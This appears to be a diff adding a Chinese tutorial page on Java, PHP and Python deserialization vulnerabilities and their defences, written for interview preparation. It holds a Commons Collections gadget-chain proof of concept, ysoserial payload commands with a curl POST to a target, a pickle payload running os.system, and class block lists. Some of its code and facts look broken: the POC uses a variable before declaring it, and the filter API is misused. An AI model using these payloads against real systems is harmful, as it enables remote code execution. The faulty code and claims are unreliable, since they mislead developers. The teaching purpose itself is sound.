@@ -1,0 +1,421 @@
+---
+title: 反序列化漏洞
+description: 反序列化漏洞原理、Java 反序列化攻击、Gadget 链构造及防御策略
+---
+
+# 反序列化漏洞
+
+序列化是为了方便存储和传输，但谁能想到，它会成为攻击者的入口？
+
+反序列化漏洞（Deserialization Vulnerability）是 Java 安全中最具破坏性的漏洞类型之一。2015 年的 Apache Commons Collections 漏洞、2017 年的 Spring Core RCE 漏洞，都是利用反序列化执行任意代码。理解这个漏洞的原理，是每个 Java 开发者必须掌握的安全知识。
+
+## 序列化与反序列化
+
+### 基本概念
+
+```java
+// 序列化：将对象转换为字节流
+public class User implements Serializable {
+    private String name;
+    private int age;
+
+    public User(String name, int age) {
+        this.name = name;
+        this.age = age;
+    }
+}
+
+// 序列化对象
+User user = new User("Alice", 30);
+ByteArrayOutputStream baos = new ByteArrayOutputStream();
+ObjectOutputStream oos = new ObjectOutputStream(baos);
+oos.writeObject(user);
+byte[] serialized = baos.toByteArray();
+
+// 反序列化：将字节流转回对象
+ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(serialized));
+User restored = (User) ois.readObject();
+```
+
+### 为什么要序列化
+
+| 场景 | 说明 |
+|---|---|
+| 网络传输 | RMI、HTTP Session 复制、JMX |
+| 缓存 | Redis、Memcached 存储对象 |
+| 持久化 | 将对象保存到数据库、文件系统 |
+| 远程调用 | Dubbo、gRPC 等 RPC 框架 |
+
+## 反序列化漏洞原理
+
+### 攻击原理
+
+Java 的 `ObjectInputStream.readObject()` 在反序列化过程中会自动调用对象的特定方法，攻击者精心构造一个「恶意对象」，让 `readObject()` 执行时触发漏洞：
+
+```
+攻击流程：
+1. 攻击者构造恶意序列化数据（包含 Gadget 链）
+2. 应用反序列化恶意数据
+3. 触发 Gadget 链中的方法调用
+4. 执行任意代码（写入文件、执行命令等）
+```
+
+### 关键概念：Gadget
+
+Gadget 是应用中存在的、可以被串联调用的代码片段。每个 Gadget 本身可能无害，但串联起来就能形成攻击链：
+
+```
+readObject()
+    ↓
+this.obj.method()
+    ↓
+this.field.get()
+    ↓
+Runtime.exec("恶意命令")
+```
+
+## 经典漏洞：Apache Commons Collections
+
+### 漏洞条件
+
+1. Apache Commons Collections 3.x - 4.x
+2. 应用使用 `InvokedTransformer` 等危险类
+3. 反序列化用户可控的数据
+
+### POC 构造
+
+```java
+// 简化版的漏洞利用代码（仅供理解原理）
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+
+import java.io.ObjectOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ByteArrayInputStream;
+
+public class CommonsCollectionsPOC {
+
+    public static void main(String[] args) throws Exception {
+        // Gadget 链：ConstantTransformer -> InvokerTransformer -> ...
+        Transformer[] transformers = new Transformer[]{
+            // 获取 Runtime 类
+            new ConstantTransformer(Runtime.class),
+            // 调用 getRuntime 方法
+            new InvokerTransformer("getMethod",
+                new Class[]{String.class, Class[].class},
+                new Object[]{"getRuntime", new Class[]{}}),
+            // 调用 getRuntime()
+            new InvokerTransformer("invoke",
+                new Class[]{Object.class, Object[].class},
+                new Object[]{null, new Object[]{}}),
+            // 调用 exec("calc")
+            new InvokerTransformer("exec",
+                new Class[]{String.class},
+                new Object[]{"calc"})
+        };
+
+        ChainedTransformer chain = new ChainedTransformer(transformers);
+
+        // 构造 AnnotationInvocationHandler（jdk.internal 中的类）
+        // 这个类重写了 readObject，在反序列化时会调用 onValue 的 transform 方法
+        // ...
+
+        // 序列化
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(payload);
+        byte[] payload = baos.toByteArray();
+
+        // 发送 payload 给目标
+        // ...
+    }
+}
+```
+
+### 实际利用工具
+
+```bash
+# 使用 ysoserial 生成 payload
+java -jar ysoserial.jar CommonsCollections6 "calc.exe" > payload.ser
+
+# 指定不同的 Gadget 链
+java -jar ysoserial.jar Groovy1 "calc.exe"
+java -jar ysoserial.jar Spring1 "calc.exe"
+java -jar ysoserial.jar ROME "calc.exe"
+
+# HTTP 请求
+curl -X POST -d "@payload.ser" http://target/api/deserialize
+```
+
+## 反序列化防御策略
+
+### 1. 不反序列化不可信数据
+
+**最佳方案：完全避免反序列化**
+
+```java
+// 使用 JSON、XML 等替代方案
+public class SafeSerialization {
+
+    // 使用 Jackson JSON
+    public String serialize(Object obj) {
+        try {
+            return new ObjectMapper().writeValueAsString(obj);
+        } catch (JsonProcessingException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    public Object deserialize(String json, Class clazz) {
+        try {
+            return new ObjectMapper().readValue(json, clazz);
+        } catch (JsonProcessingException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    // 使用 ProtoBuf
+    public byte[] serializeProto(Object obj) {
+        return obj.toByteArray();
+    }
+}
+```
+
+### 2. 使用自定义 ObjectInputStream
+
+```java
+public class SafeObjectInputStream extends ObjectInputStream {
+
+    private final Set<Class<?>> allowedClasses = new HashSet<>();
+
+    public SafeObjectInputStream(InputStream in) throws IOException {
+        super(in);
+    }
+
+    @Override
+    protected Class<?> resolveClass(ObjectStreamClass desc)
+            throws IOException, ClassNotFoundException {
+        String className = desc.getName();
+
+        // 白名单检查
+        if (!isAllowedClass(className)) {
+            throw new InvalidClassException(
+                "Deserialization of class " + className + " is not allowed");
+        }
+
+        return super.resolveClass(desc);
+    }
+
+    private boolean isAllowedClass(String className) {
+        // 只允许特定的类
+        return allowedClasses.contains(className)
+            || className.startsWith("com.example.app.model.");
+    }
+}
+
+// 使用
+public Object deserializeSafe(byte[] data, Class clazz) {
+    try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
+         SafeObjectInputStream sois = new SafeObjectInputStream(bais)) {
+        return sois.readObject();
+    } catch (ClassNotFoundException e) {
+        throw new RuntimeException(e);
+    }
+}
+```
+
+### 3. 使用 SerialKiller
+
+```xml
+<!-- Maven 依赖 -->
+<dependency>
+    <groupId>net.java.bytebuffer</groupId>
+    <artifactId>serialKiller</artifactId>
+    <version>1.1</version>
+</dependency>
+```
+
+```java
+// 使用 SerialKiller
+ObjectInputStream in = new SerialKiller(
+    inputStream,
+    "/path/to/serialKiller.conf"
+);
+Object obj = in.readObject();
+in.close();
+```
+
+```properties
+# serialKiller.conf
+# 白名单
+whitelist = com.example.app.model.*
+# 黑名单
+blacklist = org.apache.commons.*,sun.*,java.lang.Runtime
+```
+
+### 4. 使用 JEP 290（JDK 9+）
+
+```java
+// JDK 9+ 的反序列化过滤器
+public class FilteredObjectInputStream extends ObjectInputStream {
+
+    private static final Pattern ALLOWED_PATTERN =
+        Pattern.compile("^com\\.example\\.app\\.model\\.[A-Z].*");
+    private static final Set<String> BLOCKED_PREFIXES = Set.of(
+        "sun.",
+        "java.lang.Runtime",
+        "org.apache.commons.collections.functors.InvokerTransformer"
+    );
+
+    public FilteredObjectInputStream(InputStream in) throws IOException {
+        super(in);
+    }
+
+    @Override
+    protected Class<?> resolveClass(ObjectStreamClass desc)
+            throws IOException, ClassNotFoundException {
+        String name = desc.getName();
+
+        // 检查是否在黑名单
+        for (String prefix : BLOCKED_PREFIXES) {
+            if (name.startsWith(prefix)) {
+                throw new InvalidClassException("Blocked class: " + name);
+            }
+        }
+
+        return super.resolveClass(desc);
+    }
+}
+
+// 全局过滤器
+public class GlobalFilter {
+
+    static {
+        ObjectInputFilter.Factory factory = (Class<?> clazz) -> {
+            if (clazz == null) {
+                return ObjectInputFilter.Status.ALLOWED;
+            }
+
+            String name = clazz.getName();
+
+            // 允许 java.util, java.lang 基本类型
+            if (name.startsWith("java.util") || name.startsWith("java.lang")) {
+                return ObjectInputFilter.Status.ALLOWED;
+            }
+
+            // 允许应用自己的类
+            if (name.startsWith("com.example.app")) {
+                return ObjectInputFilter.Status.ALLOWED;
+            }
+
+            // 其他拒绝
+            return ObjectInputFilter.Status.REJECTED;
+        };
+
+        ObjectInputFilter.Config.setSerialFilter(factory);
+    }
+}
+```
+
+### 5. RASP（运行时应用自保护）
+
+```java
+// RASP 通过 Hook JVM 底层方法实现防护
+// 商业解决方案：OpenRASP、Contrast Protect
+
+/*
+ * OpenRASP 检测原理：
+ * 1. Hook ObjectInputStream.readObject
+ * 2. 在反序列化前检查类名
+ * 3. 检测到攻击时主动阻断并报警
+ */
+```
+
+### 6. 黑名单维护
+
+```java
+public class DeserializationSecurityManager {
+
+    // OWASP 维护的反序列化黑名单
+    private static final Set<String> BLOCKED_CLASSES = Set.of(
+        // Apache Commons Collections
+        "org.apache.commons.collections.Transformer",
+        "org.apache.commons.collections.functors.ChainedTransformer",
+        "org.apache.commons.collections.functors.InvokerTransformer",
+        "org.apache.commons.collections.functors.ConstantTransformer",
+
+        // Spring
+        "org.springframework.core.SerializableTypeWrapper",
+        "org.springframework.transaction.support.AbstractPlatformTransactionManager",
+
+        // 其他危险类
+        "sun.reflect.annotation.AnnotationInvocationHandler",
+        "com.sun.rowset.JdbcRowSetImpl",
+        "javax.management.BadAttributeValueExpException",
+        "org.apache.commons.beanutils.BeanComparator"
+    );
+
+    public static boolean isBlockedClass(String className) {
+        for (String blocked : BLOCKED_CLASSES) {
+            if (className.equals(blocked) || className.startsWith(blocked + "$")) {
+                return true;
+            }
+        }
+        return false;
+    }
+}
+```
+
+## 其他语言的反序列化漏洞
+
+### PHP 反序列化
+
+```php
+<?php
+// PHP __wakeup / __destruct 反序列化漏洞
+class User {
+    public $filename;
+
+    function __destruct() {
+        // 反序列化后，析构时执行任意文件操作
+        unlink($this->filename);
+    }
+}
+
+// 攻击者构造：
+// O:4:"User":1:{s:8:"filename";s:14:"config.php";}
+// 当对象被销毁时，会删除 config.php
+?>
+```
+
+### Python pickle 反序列化
+
+```python
+import pickle
+import base64
+
+# Python pickle 可以执行任意代码
+class RCE:
+    def __reduce__(self):
+        import os
+        # 反序列化时执行命令
+        return (os.system, ("whoami",))
+
+# 序列化为 base64
+payload = base64.b64encode(pickle.dumps(RCE()))
+print(payload)
+```
+
+## 面试追问方向
+
+- Java 反序列化漏洞的原理是什么？
+- 什么是 Gadget 链？为什么一个类单独无害，组合起来却有危害？
+- 为什么说禁止反序列化不可信数据是最好的防御？
+- JEP 290 做了什么改进？
+- 如何检测一个应用是否存在反序列化漏洞？
+- ysoserial 工具的原理是什么？
+
+> 反序列化漏洞之所以危险，是因为 Java 的序列化机制允许在反序列化时执行任意代码。**永远不要反序列化来自不可信来源的数据**，这是防御反序列化漏洞的第一原则。
